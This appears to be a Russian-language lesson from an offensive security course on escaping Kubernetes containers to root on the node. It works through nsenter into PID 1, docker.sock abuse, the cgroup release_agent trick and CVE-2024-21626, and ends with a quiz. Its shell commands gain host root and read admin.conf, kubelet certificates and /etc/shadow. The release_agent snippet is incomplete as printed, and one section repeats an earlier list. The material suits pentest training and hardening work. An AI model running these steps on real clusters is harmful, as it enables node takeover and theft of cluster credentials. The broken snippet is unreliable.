---
id: cloud-runc-escape-deep
title: "Побег из контейнера через runc: CVE и nsenter"
category: cloud
parent: cloud-k8s-security-deep
difficulty: expert
order: 3
tags: [cloud, kubernetes, runc, escape, nsenter, capabilities, seccomp, cgroup]
prerequisites: [cloud-k8s-security-deep, cloud-kubernetes-escape]
useful_for:
  - "Побег из контейнера в облаке"
  - "Эксплуатация runc/containerd CVE"
  - "Права root на хосте Kubernetes"
estimated_minutes: 55
summary: "Побег из контейнера через runc: CVE-2019-5736, CVE-2024-21626, привилегированные контейнеры, capabilities, nsenter и доступ к host-путям. Как от пода дойти до хоста."
---

## Задача

Ты получил shell внутри пода Kubernetes. Как выйти на **узел** (хост), где работает kubelet и лежат токены всех подов? Контейнер — это не песочница безопасности, а изоляция на уровне ядра. Ошибка в рантайме (**runc**/containerd) или в конфигурации (`privileged`, `hostPath`, capabilities) позволяет выйти наружу. Задача урока — от пода дойти до root на узле.

## Модель изоляции контейнера

Контейнер изолируется несколькими механизмами ядра:

- **Namespaces** (pid, mount, net, uts, ipc, user) — изоляция ресурсов.
- **cgroups** — ограничение ресурсов.
- **Capabilities** — разбитые root-привилегии (`CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`).
- **seccomp/AppArmor/SELinux** — фильтры syscall и мандатный контроль.
- **runc** — низкоуровневый рантайм, создающий контейнер; **containerd/CRI-O** — высокоуровневые.

**Побег** = обход одного или нескольких слоёв. Чаще всего виновата не «дырявая» изоляция, а небезопасная конфигурация: `privileged: true`, `hostPID`, `hostPath: /`, `CAP_SYS_ADMIN`.

## Данные, с которыми работаем

Первый шаг — понять, что у нас есть:

```bash
$ id
uid=0(root) gid=0(root) groups=0(root)
$ capsh --print | grep -i current
Current: cap_chown,cap_dac_override,cap_sys_admin,cap_sys_ptrace
$ mount | grep -E '/host|/var/lib/kubelet'
tmpfs on /host type tmpfs ...
$ ls -la /host 2>/dev/null
```

`cap_sys_admin` и `cap_sys_ptrace` в наборе, `/host` смонтирован. Этого достаточно для побега.

## Шаг 1: смотрим процессы хоста

Если под запущен с `hostPID: true`, он видит процессы узла:

```bash
$ ps aux | head -4
root 1 ... /sbin/init
root 1234 ... /usr/bin/kubelet
root 2345 ... /usr/bin/containerd
```

Процесс 1 — init хоста. Мы видим его — значит, можем войти в его namespaces.

## Шаг 2: nsenter в namespace процесса 1

**nsenter** — утилита, которая «входит» в namespaces другого процесса. Войдя в mount/pid/net процесса 1, мы получаем контекст хоста:

```bash
$ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
root@node:/#
```

Теперь мы — root на узле.

## Шаг 3: забираем креды кластера

```bash
$ ls /var/lib/kubelet/pki/
kubelet-client-current.pem
$ cat /etc/kubernetes/admin.conf 2>/dev/null | head -3
apiVersion: v1
clusters:
- cluster:
```

`admin.conf` — это admin kubeconfig: полный доступ к API-серверу. А `kubelet-client-current.pem` — сертификат kubelet.

## Шаг 4: альтернативы — docker.sock и hostPath

Если `nsenter` недоступен (seccomp), но смонтирован docker/containerd socket:

```bash
$ docker -H unix:///var/run/docker.sock run -v /:/host --privileged -it alpine chroot /host sh
```

Через docker API создаём контейнер с монтированием `/` хоста. Если смонтирован `hostPath: /` — ещё проще: `chroot /host /bin/bash`.

## Полный прогон от начала до конца

1. `capsh --print` → есть `cap_sys_admin`/`cap_sys_ptrace`.
2. `ps aux` → видим процессы хоста (hostPID).
3. `nsenter --target 1 --mount --pid` → root на узле.
4. Читаем `/etc/kubernetes/admin.conf` → admin kubeconfig.
5. Из узла — токены подов, kubelet, облачный IMDS.

## Если не сработало

- **seccomp.** Может блокировать `nsenter`/`unshare`; проверь профиль. `Unconfined` — фильтра нет.
- **AppArmor.** Может запрещать доступ к `/proc/*/root`; привилегированный контейнер обычно `unconfined`.
- **User namespaces.** Если включены, root в контейнере не root на хосте — сложнее.
- **Read-only rootfs.** Затрудняет запись, но hostPath/nsenter работают.
- **Kata/gVisor.** Другая модель изоляции — классические побеги не работают.
- **Только `CAP_SYS_ADMIN`.** В cgroup v1 сработает трюк с `release_agent` (ниже); в v2 — ищи другие пути.

## Побег через CAP_SYS_ADMIN без privileged

Даже без `privileged: true` комбинация `CAP_SYS_ADMIN` + `CAP_SYS_PTRACE` часто достаточна. В cgroup v1 классическая техника — `release_agent`, которая выполняется на хосте при выходе процесса из cgroup:

```bash
$ mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
$ echo 1 > /tmp/cgrp/x/notify_on_release
$ echo '#!/bin/sh' > /cmd
$ echo "cat /etc/shadow > \$host_path/out" >> /cmd
$ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

`release_agent` запускается вне контейнера, поэтому команда исполняется на хосте. В cgroup v2 это не работает, но остаются монтирование `/proc`, доступ к `/dev`, `io_uring`. Всегда проверяй точный набор capabilities, а не только `privileged`.

## CVE-2024-21626 (Leaky Vessels)

Отдельного внимания заслуживает **CVE-2024-21626** — утечка файлового дескриптора рабочей директории в runc. Если образ задаёт `WORKDIR`, а runc старый (< 1.1.12), контейнер может получить доступ к файловой системе хоста через унаследованный fd:

```bash
$ ls -la /proc/self/fd/ | head
lrwx------ 1 root root 64 ... 3 -> /app
$ ls -la /proc/self/fd/3/../../
# может показать содержимое хоста
```

Эксплуатация требует уязвимой версии runc и правильного образа. Ценность в том, что этот CVE даёт побег **без** привилегированного контейнера, обходя многие admission-политики, которые разрешают обычные поды. Проверяй версию runc на узле и обновляй рантайм.

## Обход защит и edge cases

Даже при защитах есть нюансы. **seccomp** может блокировать `nsenter`/`unshare` — проверь профиль; `Unconfined` фильтра не имеет. **AppArmor** может запрещать доступ к `/proc/*/root`, но привилегированный контейнер обычно `unconfined`. **User namespaces** делают root в контейнере не-root на хосте. **Read-only rootfs** мешает записи, но hostPath/nsenter работают. **Kata/gVisor** меняют модель изоляции, и классические побеги не срабатывают. Всегда проверяй точный набор capabilities и профили, а не только флаг `privileged`.

## Инструменты и CVE

Проверяя рантайм, помни о публичных CVE: **CVE-2019-5736** (перезапись бинарника runc через `/proc/self/exe`), **CVE-2021-30465** (symlink race в `mount`), **CVE-2024-21626** (утечка fd). Версия runc/containerd определяет, какие из них применимы. `runc --version` на узле (если есть доступ) или через образ покажет версию.

## Что мы теперь знаем

- Побег — это обход слоёв изоляции; чаще виновата конфигурация, а не ядро.
- `privileged`, `hostPID`, `hostPath` — прямые пути к хосту.
- `nsenter --target 1 --mount --pid` даёт контекст хоста при hostPID.
- Смонтированный docker/containerd socket = создание привилегированного контейнера.
- CVE-2024-21626 (Leaky Vessels) даёт побег через утечку fd даже без привилегий.
- `CAP_SYS_ADMIN` + cgroup v1 `release_agent` — классический побег.

## На что смотреть дальше

- **cloud-k8s-pod-security**: как найти namespace без ограничений для привилегированного пода.
- **cloud-k8s-falco-bypass**: какой runtime-детект сработает на побеге.
- **cloud-kubernetes-escape**: базовые техники побега.

## Квиз

Проверь себя.

```quiz
- question: "Что даёт privileged: true?"
  options:
    - "Практически все capabilities и доступ к устройствам хоста"
    - "Только больше памяти"
    - "Только сеть"
    - "Ничего"
  answer: 0
  explanation: "Привилегированный контейнер почти не изолирован от хоста."
- question: "Для чего нужен nsenter --target 1?"
  options:
    - "Войти в namespace процесса 1 (init хоста) и получить доступ к хосту"
    - "Создать новый контейнер"
    - "Шифровать данные"
    - "Менять DNS"
  answer: 0
  explanation: "nsenter в PID 1 с mount/pid даёт контекст хоста."
- question: "Какой CVE 2024 года связан с runc и утечкой fd?"
  options:
    - "CVE-2024-21626"
    - "CVE-2019-5736"
    - "CVE-2021-44228"
    - "CVE-2022-29162"
  answer: 0
  explanation: "Leaky Vessels / CVE-2024-21626 — утечка дескриптора рабочей директории."
- question: "Чем опасен смонтированный docker.sock?"
  options:
    - "Позволяет создать привилегированный контейнер с монтированием хоста"
    - "Только логи"
    - "Он шифрует"
    - "Он не опасен"
  answer: 0
  explanation: "Через docker API можно запустить контейнер с -v /:/host."
- question: "Почему побег через nsenter может не сработать?"
  options:
    - "Профиль seccomp может блокировать nsenter/unshare"
    - "Узел отключён"
    - "Нет интернета"
    - "Контейнер слишком мал"
  answer: 0
  explanation: "seccomp фильтрует syscall; при Unconfined фильтра нет."
```

## Куда дальше

В следующем уроке мы разберём **обход Falco** — что из этих техник заметит runtime-детект. А пока главное запомни: **контейнер — это не песочница; `privileged`, `hostPID` и `hostPath` — прямые дороги на узел, а оттуда видно весь кластер.**

## Где пригодится

- **Пентест k8s:** побег и захват узла.
- **Red team:** доступ к облачным identity через узел.
- **Blue team:** настройка Pod Security.
- **Сертификация:** CKS.
